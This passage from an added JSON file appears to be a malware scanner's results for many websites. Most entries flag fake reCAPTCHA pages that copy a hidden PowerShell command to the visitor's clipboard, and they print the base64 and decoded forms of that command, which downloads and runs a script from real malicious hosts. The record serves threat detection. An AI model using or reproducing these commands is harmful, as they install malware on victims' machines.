+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://ningbocrm.jintsume.net/",
+      "Timestamp": "2025-04-17 21:40:08",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://horno-rafelet.es/",
+      "Timestamp": "2025-04-17 21:40:09",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://mail.ningbocrm.com/",
+      "Timestamp": "2025-04-17 21:40:09",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://mail.laborpartyjo.com/",
+      "Timestamp": "2025-04-17 21:40:10",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://www.kevinzhangadmin.jintsume.net/",
+      "Timestamp": "2025-04-17 21:40:10",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://bmdcompany.com/",
+      "Timestamp": "2025-04-17 21:40:11",
+      "Base64Strings": null,
+      "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://www.zamilgroups.com/",
+      "Timestamp": "2025-04-17 21:40:11",
+      "Base64Strings": null,
+      "Urls": "https://t.me/LearnUSDT_bot?start=540835569",
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://lucprofessional.grupomoltz.com.br/",
+      "Timestamp": "2025-04-17 21:40:11",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://laborpartyjo.com/",
+      "Timestamp": "2025-04-17 21:40:12",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://www.thesignaturemag.salviatech.com/",
+      "Timestamp": "2025-04-17 21:40:12",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://www.test.peperoncinochepassione.it/",
+      "Timestamp": "2025-04-17 21:40:13",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=",
+        "Decoded": "iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "PowErsHeLL -W hiddEn \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...dC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://mail.cambodiatouristservice.com/",
+      "Timestamp": "2025-04-17 21:40:14",
+      "Base64Strings": null,
+      "Urls": [
+        "https://browser.certif-update.website/",
+        "https://browser.certif-update.website/"
+      ],
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://www.ningbocrm.jintsume.net/",
+      "Timestamp": "2025-04-17 21:40:15",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "https://my.salviatech.com/",
+      "Timestamp": "2025-04-17 21:40:15",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=",
+        "Decoded": "iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "PowErsHeLL -W hiddEn \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...dC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "http://82.146.62.232/",
+      "Timestamp": "2025-04-17 21:40:16",
+      "Base64Strings": {
+        "Base64": "aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50",
+        "Decoded": "iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content"
+      },
+      "Urls": [
+        "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css",
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"
+      ],
+      "PowerShellCommands": "POWerShEll -W h \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`;\r",
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+      ],
+      "PowerShellDownloads": {
+        "FullMatch": "| iex",
+        "URL": null,
+        "Context": "...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex\"`; stageClipboard(commandToRun, verification_id); }..."
+      }
+    },
+    {
+      "Url": "http://101.32.40.22/",
+      "Timestamp": "2025-04-17 21:40:16",
+      "Base64Strings": null,
+      "Urls": [
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css",
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png",
+        "https://www.google.com/intl/en/policies/privacy/",
+        "https://www.google.com/intl/en/policies/terms/"
+      ],
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": [
+        "✅",
+        "I am not a robot",
+        "Verification ID",
+        "reCAPTCHA Verification"
+      ],
+      "ClipboardManipulation": [
+        "...); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); }...",
+        "...dy.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextAr..."
+      ],
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "http://twitch.tj/",
+      "Timestamp": "2025-04-17 21:40:17",
+      "Base64Strings": null,
+      "Urls": null,
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": null,
+      "PowerShellDownloads": null
+    },
+    {
+      "Url": "https://staplebrokenmetaliyro.blogspot.com/",
+      "Timestamp": "2025-04-17 21:40:17",
+      "Base64Strings": null,
+      "Urls": [
+        "http://www.w3.org/1999/xhtml",
+        "http://www.google.com/2005/gml/b",
+        "http://www.google.com/2005/gml/data",
+        "http://www.google.com/2005/gml/expr",
+        "https://electricreport.org/ygd4g",
+        "https://staplebrokenmetaliyro.blogspot.com/favicon.ico",
+        "https://staplebrokenmetaliyro.blogspot.com/",
+        "https://staplebrokenmetaliyro.blogspot.com/feeds/posts/default",
+        "https://staplebrokenmetaliyro.blogspot.com/feeds/posts/default?alt=rss",
+        "https://www.blogger.com/feeds/3967763303726818370/posts/default",
+        "https://www.blogger.com/profile/02686294779557843862",
+        "https://staplebrokenmetaliyro.blogspot.com/",
+        "https://www.blogblog.com/indie/mspin_black_large.svg",
+        "https://www.blogblog.com/indie/mspin_white_large.svg",
+        "https://themes.googleusercontent.com/image?id=L1lcAxxz0CLgsDzixEprHJ2F38TyEjCyE3RSAjynQDks0lT1BDc1OxXKaTEdLc89HPvdB11X9FDw",
+        "http://www.offset.com/photos/394244",
+        "https://www.gstatic.com/external_hosted/clipboardjs/clipboard.min.js",
+        "http://www.w3.org/1999/xlink",
+        "http://www.w3.org/1999/xlink",
+        "https://staplebrokenmetaliyro.blogspot.com/search",
+        "https://www.blogger.com",
+        "http://www.w3.org/1999/xlink",
+        "http://www.offset.com/photos/394244",
+        "http://www.w3.org/1999/xlink",
+        "https://www.blogger.com/profile/02686294779557843862",
+        "http://www.w3.org/1999/xlink",
+        "https://www.blogger.com/profile/02686294779557843862",
+        "https://www.blogger.com/profile/02686294779557843862",
+        "https://www.blogger.com/go/report-abuse",
+        "https://resources.blogblog.com/blogblog/data/res/2796432393-indie_compiled.js",
+        "https://www.blogger.com/static/v1/widgets/2218197725-widgets.js",
+        "https://staplebrokenmetaliyro.blogspot.com/",
+        "https://staplebrokenmetaliyro.blogspot.com/",
+        "https://staplebrokenmetaliyro.blogspot.com/",
